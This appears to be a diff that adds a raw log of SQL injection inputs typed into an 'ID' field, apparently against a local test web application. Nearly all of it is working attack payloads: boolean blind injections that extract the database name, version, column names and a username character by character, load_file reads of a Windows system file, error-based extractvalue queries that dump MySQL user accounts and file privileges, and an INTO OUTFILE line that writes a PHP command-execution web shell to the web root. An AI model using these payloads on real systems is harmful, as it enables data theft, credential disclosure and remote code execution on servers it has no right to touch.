@@ -1,0 +1,144 @@
+ID:12
+ID:1
+ID:1'
+ID:1'-- 
+ID:1' UNION ORDER BY 1-- 
+ID:1' OR 1=1-- 
+ID:1' UNION SELECT 1,1,1-- 
+ID:1' AND length(database()) >6-- 
+ID:1' AND length(database()) =8-- 
+ID:1’ AND SUBSTRING(database(),1,1 = ’a’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1 = ’a’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1 = ’i’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1 = ’i’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1 = ’i’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = ’i’-- 
+ID:1’ AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = 'i'-- 
+ID:1' AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = 'i'-- 
+ID:1' AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),2,1) = 'd'-- 
+ID:1' AND SUBSTRING((SELECT username from users where id='1'),1,1) = 'D'-- 
+ID:1' AND SUBSTRING((SELECT username from users where id='1'),1,1) = 'D'-- 
+ID:1' AND SUBSTRING(database(),1,1 = 'a'-- 
+ID:1' AND SUBSTRING(database(),1,1) = 'a'-- 
+ID:1' AND SUBSTRING(database(),1,1) = 's'-- 
+ID:1' AND SUBSTRING(database(),2,1) = 'e'-- 
+ID:1' AND SUBSTRING(database(),1,1)='a'-- 
+ID:1' AND SUBSTRING(database(),1,1)='b'-- 
+ID:1' AND SUBSTRING(database(),1,1)='c'-- 
+ID:1' AND SUBSTRING(database(),1,1)='d'-- 
+ID:1' AND SUBSTRING(database(),1,1)='e'-- 
+ID:1' AND SUBSTRING(database(),1,1)='f'-- 
+ID:1' AND SUBSTRING(database(),1,1)='g'-- 
+ID:1' AND SUBSTRING(database(),1,1)='h'-- 
+ID:1' AND SUBSTRING(database(),1,1)='i'-- 
+ID:1' AND SUBSTRING(database(),1,1)='j'-- 
+ID:1' AND SUBSTRING(database(),1,1)='k'-- 
+ID:1' AND SUBSTRING(database(),1,1)='l'-- 
+ID:1' AND SUBSTRING(database(),1,1)='m'-- 
+ID:1' AND SUBSTRING(database(),1,1)='n'-- 
+ID:1' AND SUBSTRING(database(),1,1)='o'-- 
+ID:1' AND SUBSTRING(database(),1,1)='p'-- 
+ID:1' AND SUBSTRING(database(),1,1)='q'-- 
+ID:1' AND SUBSTRING(database(),1,1)='r'-- 
+ID:1' AND SUBSTRING(database(),1,1)='s'-- 
+ID:1' AND SUBSTRING(database(),2,1)='a'-- 
+ID:1' AND SUBSTRING(version(),1,1)='a'-- 
+ID:1' AND SUBSTRING(version(),1,1)='b'-- 
+ID:1' AND SUBSTRING(version(),1,1)='c'-- 
+ID:1' AND SUBSTRING(version(),1,1)='d'-- 
+ID:1' AND SUBSTRING(version(),1,1)='e'-- 
+ID:1' AND SUBSTRING(version(),1,1)='f'-- 
+ID:1' AND SUBSTRING(version(),1,1)='g'-- 
+ID:1' AND SUBSTRING(version(),1,1)='h'-- 
+ID:1' AND SUBSTRING(version(),1,1)='i'-- 
+ID:1' AND SUBSTRING(version(),1,1)='j'-- 
+ID:1' AND SUBSTRING(version(),1,1)='0'-- 
+ID:1' AND SUBSTRING(version(),1,1)='1'-- 
+ID:1' AND SUBSTRING(version(),1,1)='2'-- 
+ID:1' AND SUBSTRING(version(),1,1)='3'-- 
+ID:1' AND SUBSTRING(version(),1,1)='4'-- 
+ID:1' AND SUBSTRING(version(),1,1)='5'-- 
+ID:1' AND SUBSTRING(version(),2,1)='0'-- 
+ID:1' AND SUBSTRING(version(),2,1)='1'-- 
+ID:1' AND SUBSTRING(version(),2,1)='2'-- 
+ID:1' AND SUBSTRING(version(),2,1)='3'-- 
+ID:1' AND SUBSTRING(version(),2,1)='4'-- 
+ID:1' AND SUBSTRING(version(),2,1)='5'-- 
+ID:1' AND SUBSTRING(version(),2,1)='6'-- 
+ID:1' AND SUBSTRING(version(),2,1)='7'-- 
+ID:1' AND SUBSTRING(version(),2,1)='8'-- 
+ID:1' AND SUBSTRING(version(),2,1)='9'-- 
+ID:1' AND SUBSTRING(version(),2,1)='.'-- 
+ID:1' AND SUBSTRING(version(),3,1)='0'-- 
+ID:1' AND SUBSTRING(version(),3,1)='1'-- 
+ID:1' AND SUBSTRING(version(),1,1)='0'-- 
+ID:1' AND SUBSTRING(version(),1,1)='1'-- 
+ID:1' AND SUBSTRING(version(),1,1)='2'-- 
+ID:1' AND SUBSTRING(version(),1,1)='3'-- 
+ID:1' AND SUBSTRING(version(),1,1)='4'-- 
+ID:1' AND SUBSTRING(version(),1,1)='5'-- 
+ID:1' AND SUBSTRING(version(),2,1)='0'-- 
+ID:1' AND SUBSTRING(version(),2,1)='1'-- 
+ID:1' AND SUBSTRING(version(),2,1)='2'-- 
+ID:1' AND SUBSTRING(version(),2,1)='3'-- 
+ID:1' AND SUBSTRING(version(),2,1)='4'-- 
+ID:1' AND SUBSTRING(version(),2,1)='5'-- 
+ID:1' AND SUBSTRING(version(),2,1)='6'-- 
+ID:1' AND SUBSTRING(version(),2,1)='7'-- 
+ID:1' AND SUBSTRING(version(),2,1)='8'-- 
+ID:1' AND SUBSTRING(version(),2,1)='9'-- 
+ID:1' AND SUBSTRING(version(),2,1)='.'-- 
+ID:1' AND SUBSTRING(version(),3,1)='0'-- 
+ID:1' AND SUBSTRING(version(),3,1)='1'-- 
+ID:1' AND SUBSTRING(version(),3,1)='2'-- 
+ID:1' AND SUBSTRING(version(),3,1)='3'-- 
+ID:1' AND SUBSTRING(version(),3,1)='4'-- 
+ID:1' AND SUBSTRING(version(),3,1)='5'-- 
+ID:1' AND SUBSTRING(version(),4,1)='0'-- 
+ID:1' AND SUBSTRING(version(),4,1)='1'-- 
+ID:1' AND SUBSTRING(version(),4,1)='2'-- 
+ID:1' AND SUBSTRING(version(),4,1)='3'-- 
+ID:1' AND SUBSTRING(version(),4,1)='4'-- 
+ID:1' AND SUBSTRING(version(),4,1)='5'-- 
+ID:1' AND SUBSTRING(version(),4,1)='6'-- 
+ID:1' AND SUBSTRING(version(),4,1)='7'-- 
+ID:1' AND SUBSTRING(version(),4,1)='8'-- 
+ID:1' AND SUBSTRING(version(),4,1)='9'-- 
+ID:1' AND SUBSTRING(version(),4,1)='.'-- 
+ID:1' AND SUBSTRING(version(),5,1)='0'-- 
+ID:1' AND SUBSTRING(version(),5,1)='1'-- 
+ID:1' AND SUBSTRING(version(),5,1)='2'-- 
+ID:1' AND SUBSTRING(version(),5,1)='3'-- 
+ID:1' AND SUBSTRING(version(),5,1)='4'-- 
+ID:1' AND SUBSTRING(version(),5,1)='5'-- 
+ID:1' AND SUBSTRING(version(),5,1)='6'-- 
+ID:1' AND SUBSTRING(version(),6,1)='0'-- 
+ID:1' AND SUBSTRING(version(),6,1)='1'-- 
+ID:1' AND SUBSTRING(version(),6,1)='2'-- 
+ID:1' AND SUBSTRING(version(),7,1)='0'-- 
+ID:1' AND SUBSTRING(version(),7,1)='1'-- 
+ID:1' AND SUBSTRING(version(),7,1)='2'-- 
+ID:1' AND SUBSTRING(version(),7,1)='3'-- 
+ID:1' AND SUBSTRING(version(),7,1)='4'-- 
+ID:1' AND SUBSTRING(version(),7,1)='5'-- 
+ID:1' AND SUBSTRING(version(),7,1)='6'-- 
+ID:1' AND SUBSTRING(version(),7,1)='7'-- 
+ID:1' AND SUBSTRING(version(),7,1)='8'-- 
+ID:1' AND SUBSTRING(version(),7,1)='9'-- 
+ID:1' AND SUBSTRING(version(),7,1)='.'-- 
+ID:1' UNION select 1,load_file('C:\\\\Windows\\\\win.ini'),1-- 
+ID:1' UNION select --"<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- '
+ID:1' and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)='a'-- 
+ID:1' and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:1' and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:123
+ID:12
+ID:12
+ID:199
+ID:199'
+ID:' and extractvalue(1,concat(0x7e,(select group_concat(user,0x7e.file_priv,0x7e) from mysql.user)))-- 
+ID:' and extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user)))-- 
+ID:" or extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e from mysql.user))))-- 
+ID:" or extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user))))-- 
+ID:" or extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user)))-- 
+ID:"
